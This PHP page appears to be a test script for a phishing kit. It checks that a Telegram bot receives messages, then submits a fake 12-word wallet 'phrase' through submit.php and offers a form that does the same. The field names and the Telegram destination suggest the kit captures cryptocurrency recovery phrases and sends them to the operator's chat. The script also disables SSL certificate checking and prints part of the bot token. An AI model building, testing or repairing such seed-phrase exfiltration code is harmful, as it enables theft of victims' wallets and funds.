<?php
/**
 * DIRECT TELEGRAM TEST - This will test Telegram connection directly
 * Visit this file in your browser to test
 */

header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html>
<head>
    <title>Direct Telegram Test</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .success { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .error { background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .info { background: #d1ecf1; color: #0c5460; padding: 15px; border-radius: 5px; margin: 10px 0; }
        pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; border: 1px solid #ddd; }
        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 10px 5px; }
        button:hover { background: #0056b3; }
        textarea { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin: 10px 0; font-family: monospace; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 Direct Telegram Test</h1>
        
        <?php
        // Load config
        require_once 'config.php';
        
        echo "<div class='info'><strong>Configuration:</strong><br>";
        echo "Bot Token: " . substr(TELEGRAM_BOT_TOKEN, 0, 20) . "...<br>";
        echo "Chat ID: " . TELEGRAM_CHAT_ID . "<br>";
        echo "API URL: " . TELEGRAM_API_URL . "<br>";
        echo "</div>";
        
        // Test message
        $testMessage = "🧪 *DIRECT TEST MESSAGE*\n\n";
        $testMessage .= "✅ *Status:* Direct PHP Test\n";
        $testMessage .= "🕐 *Time:* " . date('Y-m-d H:i:s') . "\n";
        $testMessage .= "🌐 *Server:* " . ($_SERVER['SERVER_NAME'] ?? 'Local') . "\n\n";
        $testMessage .= "If you see this, the Telegram integration is working! 🎉";
        
        echo "<h2>Test 1: Direct cURL Test</h2>";
        
        $telegramData = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $testMessage,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, TELEGRAM_API_URL);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegramData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_VERBOSE, true);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        $curlInfo = curl_getinfo($ch);
        curl_close($ch);
        
        echo "<div class='info'><strong>Request Details:</strong><br>";
        echo "URL: " . TELEGRAM_API_URL . "<br>";
        echo "HTTP Code: " . $httpCode . "<br>";
        if ($curlError) {
            echo "cURL Error: " . $curlError . "<br>";
        }
        echo "</div>";
        
        if ($httpCode === 200) {
            $result = json_decode($response, true);
            if (isset($result['ok']) && $result['ok'] === true) {
                echo "<div class='success'><strong>✅ SUCCESS!</strong><br>";
                echo "Message sent successfully! Check your Telegram now.<br>";
                echo "Message ID: " . ($result['result']['message_id'] ?? 'N/A') . "</div>";
            } else {
                echo "<div class='error'><strong>❌ Telegram API Error:</strong><br>";
                echo "Description: " . ($result['description'] ?? 'Unknown error') . "<br>";
                echo "Error Code: " . ($result['error_code'] ?? 'N/A') . "</div>";
            }
        } else {
            echo "<div class='error'><strong>❌ HTTP Error:</strong><br>";
            echo "HTTP Code: " . $httpCode . "<br>";
            if ($curlError) {
                echo "cURL Error: " . $curlError . "<br>";
            }
            echo "</div>";
        }
        
        echo "<h3>Full Response:</h3>";
        echo "<pre>" . htmlspecialchars($response) . "</pre>";
        
        // Test 2: Simulate form submission
        echo "<hr><h2>Test 2: Simulate Form Submission</h2>";
        
        $_POST['phrase'] = 'test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12';
        $_POST['wallet_id'] = 'Test Wallet';
        $_SERVER['REQUEST_METHOD'] = 'POST';
        
        ob_start();
        include 'submit.php';
        $submitOutput = ob_get_clean();
        
        echo "<div class='info'><strong>Submit.php Output:</strong></div>";
        echo "<pre>" . htmlspecialchars($submitOutput) . "</pre>";
        ?>
        
        <hr>
        <h2>Test 3: Manual Form Test</h2>
        <form method="POST" action="submit.php" style="margin-top: 20px;">
            <textarea name="phrase" placeholder="Enter test phrase" rows="3" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin: 10px 0; font-family: monospace;">test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12</textarea>
            <input type="hidden" name="wallet_id" value="Manual Test">
            <button type="submit">Send Test via submit.php</button>
        </form>
        
        <div class="info" style="margin-top: 20px;">
            <strong>Next Steps:</strong><br>
            1. If Test 1 works, your Telegram credentials are correct ✅<br>
            2. If Test 1 fails, check your Bot Token and Chat ID<br>
            3. If Test 2 fails, there's an issue with submit.php<br>
            4. Check server error logs in cPanel<br>
            5. Make sure cURL is enabled on your server
        </div>
    </div>
</body>
</html>

